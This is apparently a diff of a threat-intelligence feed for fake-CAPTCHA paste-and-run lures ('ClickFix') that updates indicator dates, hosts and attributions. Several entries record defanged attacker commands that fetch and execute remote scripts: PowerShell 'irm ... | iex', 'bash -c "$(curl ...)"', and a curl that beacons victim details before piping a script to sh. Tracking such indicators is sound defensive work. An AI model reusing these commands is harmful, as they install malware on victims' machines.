@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5848,
+ "count": 5854,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -618,10 +618,10 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-15",
-   "last_seen": "2026-11-24",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "http://123.57.95.207/",
+   "url": "https://123.57.95.207/",
    "brand": null,
    "product": null,
    "hosting": "Alibaba Cloud",
@@ -636,7 +636,7 @@
      "host": "123.57.95.207",
      "status": "online",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-24"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -1620,7 +1620,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-23",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://161.118.211.157/",
@@ -1638,7 +1638,7 @@
      "host": "161.118.211.157",
      "status": "online",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -27407,10 +27407,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh"
+    "echo '[encoded]' | base64 -d | zsh",
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro"
+    "entitlementcheck.pro",
+    "browse-login.info"
    ],
    "lure_from": [
     "makeverizyjar.info",
@@ -27923,7 +27925,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://www.archsector.com/",
@@ -27941,15 +27943,21 @@
      "asn": "AS209242",
      "org": "Cloudflare London, LLC",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
     {
+     "host": "archsector.com",
+     "status": "unknown",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    },
+    {
      "host": "www.archsector.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -28281,11 +28289,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'sdpl7m11[.]aafiasahan[.]org/?ublib=')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'fxngzogd[.]flex0[.]store/?ublib=c274620d-3c09-4100-84bb-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'oyqdn8je[.]etext[.]store/?ublib=eae0c432-aa20-4120-85f2-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX"
    ],
    "connects_to": [
+    "sdpl7m11.aafiasahan.org",
     "fxngzogd.flex0.store",
     "oyqdn8je.etext.store"
    ],
@@ -34334,11 +34343,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'akmeln6i[.]aafiasahan[.]org/?ublib=')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '43jyk703[.]flex0[.]store/?ublib=32a90234-d820-4976-81d4-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'tg857n28[.]evine[.]store/?ublib=286127eb-f7c8-4f1d-9b7e-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX"
    ],
    "connects_to": [
+    "akmeln6i.aafiasahan.org",
     "43jyk703.flex0.store",
     "tg857n28.evine.store"
    ],
@@ -35121,7 +35131,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://awtad-albarakeh.com/",
@@ -35139,7 +35149,7 @@
      "asn": "AS24940",
      "org": "Hetzner Online GmbH",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -35147,7 +35157,7 @@
      "host": "awtad-albarakeh.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -36882,11 +36892,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '1afku4co[.]aafiasahan[.]org/?ublib=')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'x5477ree[.]flex0[.]store/?ublib=72a5be89-1817-431a-b25b-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'qoxliv53[.]evine[.]store/?ublib=f2bcf436-dc95-4c9f-9959-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+    "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-[id]/-/raw/main/58C-4dC67f645812 | IEX"
    ],
    "connects_to": [
+    "1afku4co.aafiasahan.org",
     "x5477ree.flex0.store",
     "qoxliv53.evine.store"
    ],
@@ -53182,17 +53193,17 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-21",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://brfvapendragaren.com/",
+   "url": "http://brfvapendragaren.com/",
    "brand": null,
    "product": null,
    "hosting": "LOOPIA Loopia AB",
    "dns": "loopia.se",
    "ip": "93.188.2.54",
    "asn": "AS39570",
-   "org": "LOOPIA Loopia AB, SE",
+   "org": "Loopia AB",
    "country": "SE",
    "ips": [
     {
@@ -53200,7 +53211,7 @@
      "asn": "AS39570",
      "org": "LOOPIA Loopia AB, SE",
      "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -53208,7 +53219,7 @@
      "host": "brfvapendragaren.com",
      "status": "online",
      "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -55960,7 +55971,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://www.buydocsandnotes.com/",
@@ -55978,7 +55989,7 @@
      "asn": "AS24940",
      "org": "Hetzner Online GmbH",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -55986,7 +55997,7 @@
      "host": "www.buydocsandnotes.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -56538,15 +56549,15 @@
    "commands": [
     "irm 'jscdncloude[.]beer/[id]'|iex;",
     "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "%COMSPEC% /c %COMSPEC% /c %COMSPEC% /c start \"\" /^min for /f \"delims=\" %w in ('where ,f*n*er,') do for /f \"delims=\" %g in ('\"%w\" [email]') do @%g & --------------P_u_s_h----t_h_e----_E_n_t_e_r_------"
+    "irm 'browse-login[.]info/[id]'|iex"
    ],
    "connects_to": [
     "dns-api.org",
     "jscdncloude.beer",
     "cloud-browse.codes",
+    "browse-login.info",
     "ncheck-brows.beer",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -92784,7 +92795,7 @@
    "status": "online",
    "first_seen": "2026-10-11",
    "last_seen": "2026-10-27",
-   "last_online": "2026-11-25",
+   "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://http418infosec.com.dream.website/",
    "brand": null,
@@ -93254,7 +93265,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://drepoxyfloor.com/",
@@ -93272,7 +93283,7 @@
      "asn": "AS204213",
      "org": "Netmihan Communication Company Ltd",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -93280,7 +93291,13 @@
      "host": "drepoxyfloor.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
+    },
+    {
+     "host": "www.drepoxyfloor.com",
+     "status": "unknown",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -94599,7 +94616,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://dsfhof.com/",
@@ -94617,7 +94634,7 @@
      "asn": "AS54641",
      "org": "InMotion Hosting, Inc.",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -94625,7 +94642,7 @@
      "host": "dsfhof.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -96783,17 +96800,17 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://easyzionwedding.com/",
+   "url": "http://easyzionwedding.com/",
    "brand": null,
    "product": null,
    "hosting": "Newfold (Bluehost / HostGator)",
    "dns": "GoDaddy",
    "ip": "50.87.139.17",
    "asn": "AS46606",
-   "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
+   "org": "Unified Layer",
    "country": "US",
    "ips": [
     {
@@ -96801,7 +96818,7 @@
      "asn": "AS46606",
      "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -96809,7 +96826,7 @@
      "host": "easyzionwedding.com",
      "status": "online",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -101603,7 +101620,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://nazimco.elitewerks.com/",
@@ -101621,7 +101638,7 @@
      "asn": "AS45839",
      "org": "Shinjiru Technology Sdn Bhd",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -101629,13 +101646,13 @@
      "host": "nazimco.elitewerks.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.nazimco.elitewerks.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -112315,7 +112332,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://email.fincasdeduggan.com.ar/",
@@ -112333,10 +112350,16 @@
      "asn": "AS16276",
      "org": "OVH SAS",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
+    {
+     "host": "a.fincasdeduggan.com.ar",
+     "status": "unknown",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    },
     {
      "host": "dev.fincasdeduggan.com.ar",
      "status": "online",
@@ -112353,7 +112376,7 @@
      "host": "email.fincasdeduggan.com.ar",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "login.staging.fincasdeduggan.com.ar",
@@ -112368,6 +112391,12 @@
      "last_seen": "2026-10-19"
     },
     {
+     "host": "smtpmail.fincasdeduggan.com.ar",
+     "status": "unknown",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    },
+    {
      "host": "staging.fincasdeduggan.com.ar",
      "status": "online",
      "first_seen": "2026-10-19",
@@ -112377,7 +112406,7 @@
      "host": "www.fincasdeduggan.com.ar",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -135564,17 +135593,17 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-18",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://handhportland.com/",
+   "url": "http://handhportland.com/",
    "brand": null,
    "product": null,
    "hosting": "OVHcloud",
    "dns": "phalconhostings.com",
    "ip": "40.160.35.205",
    "asn": "AS16276",
-   "org": "OVH OVH SAS, FR",
+   "org": "OVH SAS",
    "country": "US",
    "ips": [
     {
@@ -135582,7 +135611,7 @@
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-11-18",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -135590,7 +135619,7 @@
      "host": "handhportland.com",
      "status": "online",
      "first_seen": "2026-11-18",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -139093,7 +139122,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://mail.hicarebd.com/",
@@ -139111,7 +139140,7 @@
      "asn": "AS16276",
      "org": "OVH SAS",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -139119,19 +139148,19 @@
      "host": "hicarebd.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "mail.hicarebd.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.hicarebd.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -153003,7 +153032,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://ironcladcorporation.com/",
@@ -153021,7 +153050,7 @@
      "asn": "AS19318",
      "org": "Interserver, Inc",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -153029,7 +153058,7 @@
      "host": "ironcladcorporation.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -157642,7 +157671,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://www.jayadityametal.com/",
@@ -157660,7 +157689,7 @@
      "asn": "AS47583",
      "org": "Hostinger International Limited",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -157668,7 +157697,7 @@
      "host": "www.jayadityametal.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -167603,7 +167632,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-10-19",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "https://www.kistelekopen.com/",
@@ -167621,7 +167650,7 @@
      "asn": "AS51013",
      "org": "WebSupport s.r.o.",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -167629,13 +167658,13 @@
      "host": "kistelekopen.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.kistelekopen.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -174201,6 +174230,58 @@
    ]
   },
   {
+   "indicator": "learnwithquantum.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://whatsapp.learnwithquantum.com/",
+   "brand": "Meta",
+   "product": "WhatsApp",
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "2a02:4780:44:b11a:57e0:5611:acf:f4f3",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2a02:4780:44:b11a:57e0:5611:acf:f4f3",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger Operations UAB, LT",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "whatsapp.learnwithquantum.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "curl -sL -d \"id=81a05226-508f-4070-9135-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwhatsapp.learnwithquantum.com%2F&os=Mac%2015&lastVisitAt=2026-11-26T00%3A49%3A53.482Z&lastShellAt=2026-11-26T00%3A49%3A53.482Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=3bf05273-4979-469f-af89-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwhatsapp.learnwithquantum.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-26T00%3A36%3A54.811Z\"\" -d \"\"lastShellAt=2026-11-26T00%3A36%3A54.811Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "browse-login.info"
+   ]
+  },
+  {
    "indicator": "leasego.cz",
    "type": "domain",
    "category": "clickfix",
@@ -175117,7 +175198,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://panel.lemonresearch.com/",
@@ -175135,7 +175216,7 @@
      "asn": "AS8893",
      "org": "Artfiles New Media GmbH",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -175143,7 +175224,7 @@
      "host": "panel.lemonresearch.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -179836,7 +179917,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://lumiere-dumonde.com/",
@@ -179854,7 +179935,7 @@
      "asn": "AS8560",
      "org": "IONOS SE",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -179862,7 +179943,7 @@
      "host": "lumiere-dumonde.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -201973,6 +202054,56 @@
    ]
   },
   {
+   "indicator": "myperfectgreen.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://www.myperfectgreen.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "GoDaddy",
+   "ip": "160.153.0.176",
+   "asn": "AS209242",
+   "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "160.153.0.176",
+     "asn": "AS209242",
+     "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.myperfectgreen.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": [
+    "makeverizyjar.info"
+   ]
+  },
+  {
    "indicator": "myrecruitingsolutions.com",
    "type": "domain",
    "category": "clickfix",
@@ -203313,7 +203444,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://mail.nazimco.com/",
@@ -203331,7 +203462,7 @@
      "asn": "AS45839",
      "org": "Shinjiru Technology Sdn Bhd",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -203339,19 +203470,19 @@
      "host": "mail.nazimco.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "nazimco.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-19"
+     "last_seen": "2026-11-26"
     },
     {
      "host": "www.nazimco.com",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": null,
@@ -208847,17 +208978,17 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-21",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://nuridental.com/",
+   "url": "http://nuridental.com/",
    "brand": null,
    "product": null,
    "hosting": "Oracle Cloud",
    "dns": "Newfold",
    "ip": "50.6.160.66",
    "asn": "AS31898",
-   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+   "org": "Oracle Corporation",
    "country": "US",
    "ips": [
     {
@@ -208865,7 +208996,7 @@
      "asn": "AS31898",
      "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
      "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -208873,7 +209004,7 @@
      "host": "nuridental.com",
      "status": "online",
      "first_seen": "2026-11-21",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -216702,10 +216833,10 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
-   "url": "https://patriciaoteropropiedades.com.ar/",
+   "url": "http://www.patriciaoteropropiedades.com.ar/",
    "brand": null,
    "product": null,
    "hosting": "Hetzner",
@@ -216720,7 +216851,7 @@
      "asn": "AS24940",
      "org": "Hetzner Online GmbH",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -216728,7 +216859,13 @@
      "host": "patriciaoteropropiedades.com.ar",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
+    },
+    {
+     "host": "www.patriciaoteropropiedades.com.ar",
+     "status": "unknown",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -217709,7 +217846,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-26",
    "last_online": "2026-11-26",
    "offline_since": null,
    "url": "http://pendulumpalettes.com/",
@@ -217727,7 +217864,7 @@
      "asn": "AS26347",
      "org": "New Dream Network, LLC",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "hosts": [
@@ -217735,7 +217872,7 @@
      "host": "pendulumpalettes.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-26"
     }
    ],
    "actor": "dprk",
@@ -220182,6 +220319,54 @@
    "lure_from": [
     "interseq.at"
    ]
+  },
+  {
+   "indicator": "pistolerasonlineslots.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-26",
+   "last_seen": "2026-11-26",
+   "last_online": "2026-11-26",
+   "offline_since": null,
+   "url": "https://www.pistolerasonlineslots.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "188.114.96.3",
+   "asn": "AS13335",
+   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+   "country": null,
+   "ips": [
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.pistolerasonlineslots.com",
+     "status": "online",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-26"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'browse-login[.]info/[id]'|iex"
+   ],
+   "connects_to": [
+    "browse-login.info"
+   ],
+   "lure_from": []
   },
   {
    "indicator": "pitainterior.com",
@@ -225721,64 +225906,6 @@
    ]
   },
   {
-   "indicator": "priyanshuportfolios.rf.gd",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-28",
-   "last_seen": "2026-10-30",
-   "last_online": "2026-11-26",
-   "offline_since": null,
